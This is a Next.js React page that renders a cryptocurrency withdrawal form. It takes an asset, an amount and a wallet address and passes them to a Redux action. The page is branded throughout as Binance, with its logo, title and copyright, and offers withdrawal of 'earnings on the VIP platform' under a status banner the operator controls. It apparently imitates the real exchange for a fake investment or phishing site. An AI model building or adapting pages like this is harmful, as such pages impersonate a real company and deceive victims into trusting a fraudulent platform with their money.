import Head from 'next/head'
import { useRouter } from 'next/router'
import { useState, useEffect, useRef } from 'react'
import Link from 'next/link'
import { LockClosedIcon } from "@heroicons/react/solid"
import Loader from '../../components/loader'
import { useDispatch, useSelector } from 'react-redux'
import { makeWithdrawRequest } from '../../redux/APP_STATE/actions'

export default function Withdrawal() {
  const router = useRouter()
  const user = useSelector(state => state.APP_STATE.user)
  const dispatch = useDispatch()
  const formRef = useRef(null)

  const handle_withdraw_request = (e) => {
    e.preventDefault()
    const form = formRef.current
    const amount = form.amount.value
    const crypto = form.crypto.value
    const wallet_address = form.wallet_address.value

    const request_data = {
      amount,
      crypto,
      wallet_address,
      email: user?.email
    }

    // Call a Redux Action Here!
    dispatch(makeWithdrawRequest(request_data))
  }

  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
        <Loader />
      <Head>
        <title>Withdrawal | Binance</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      {/* LOGIN HEADER */}
      <div id="Header" className='flex justify-between p-5'>
        <div className="logo">
          <img className='h-6' src="/binance-logo.svg" alt="Logo" />
        </div>
        <div className="menu">English |</div>
      </div>
      
      {/* Withdraw Status INFO ------------------- */}
      {user && (
        <div className={`${ user.status !== '' ? 'block' : 'hidden' } w-full flex items-center justify-center p-2.5 text-xs text-gray-700 bg-[#FEF6D8]`}>
          <p>{ user?.status }</p>
        </div>
      )}
      {/* Withdraw Status INFO ------------------- */}

      {/* ====================== LOGIN SECTION ==================== */}
      <div className="max-w-4xl px-5 pt-10 pb-3 md:p-16 mx-auto md:flex justify-between items-end">
        <div className="w-full md:w-[400px] mb-5 md:mb-0">
          <h2 className="text-2xl md:text-3xl font-semibold mt-2 sm:mt-0 mb-10 md:my-2">Withdrawal</h2>
          <p className='text-gray-600 text-base pt-2'>Withdraw your earnings on the VIP <img src="/binance-diamond-logo.svg" alt="" className="inline h-4" /> platform.</p>
          <form className="my-5" ref={formRef} onSubmit={ handle_withdraw_request }>
            <div className="input_field">
              <label className="block">Select asset</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                {/* <input type="number" placeholder='e.g 1000 USD' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' /> */}
                <select name="crypto" className='select py-3.5 pr-3.5 w-full outline-none appearance-none' >
                    <option value="">Select</option>
                    <option selected value="btc">Bitcoin (BTC)</option>
                    <option value="eth">Ethereum (ETH)</option>
                    <option value="bnb">Binance Coin (BNB)</option>
                    <option value="busd">Binance USD (BUSD)</option>
                    <option value="usdt">Tether (USDT)</option>
                </select>
                 {/* <span className="inline-block text-primary_dim font-semibold cursor-pointer mr-1">Get code</span>  */}
              </div>
            </div>
            <div className="input_field">
              <label className="block">Enter amount to withdraw</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                <input type="number" name='amount' placeholder='e.g 1000 USD' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' required />
                 {/* <span className="inline-block text-primary_dim font-semibold cursor-pointer mr-1">Get code</span>  */}
              </div>
            </div>
            <div className="input_field">
              <label className="block">Paste wallet address</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                <input type="text" name='wallet_address' placeholder='Wallet address' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' required />
                 {/* <span className="inline-block text-primary_dim font-semibold cursor-pointer mr-1">Get code</span>  */}
              </div>
            </div>

            {/* <button className="w-full bg-gradient-to-b from-primary to-[#E49F5E] text-center text-gray-800 font-semibold p-3 rounded-sm">Log In</button> */}
            <button className="w-full bg-primary text-center text-gray-800 font-semibold p-3 mt-3 rounded-sm">Request Withdrawal</button>
          </form>
          <Link href="/signup"><span className="text-primary_dim my-2 cursor-pointer">Unable to deposit?</span></Link>
        </div>
      </div>
      <footer>
        <div className="w-full pt-10 text-xs absolute bottom-5 text-gray-500 text-center">&copy; 2017 - { new Date().getFullYear() } Binance.com All rights reserved</div>
      </footer>
    </div>
  )
}
